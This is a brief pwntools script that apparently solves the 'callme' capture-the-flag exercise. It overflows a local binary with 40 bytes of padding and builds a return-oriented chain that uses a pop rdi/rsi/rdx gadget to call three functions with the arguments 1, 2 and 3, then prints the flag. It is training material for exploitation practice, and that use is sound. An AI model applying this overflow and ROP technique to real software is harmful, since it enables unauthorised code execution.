from pwn import *

elf = context.binary = ELF('callme')

callme1 = p64(elf.symbols.callme_one)
callme2 = p64(elf.symbols.callme_two)
callme3 = p64(elf.symbols.callme_three)

pop3_ret = p64(0x0000000000401ab0) # pop rdi; pop rsi; pop rdx; ret

args = p64(1) + p64(2) + p64(3)

pad  = 'A'*40

rop  = pop3_ret
rop += args
rop += callme1

rop += pop3_ret
rop += args
rop += callme2

rop += pop3_ret
rop += args
rop += callme3

payload = pad + rop

io = process(elf.path)

io.sendline(payload)

# Read stuff
io.recvuntil("> ")
flag = io.recvall()

# Print flag
log.success(flag)
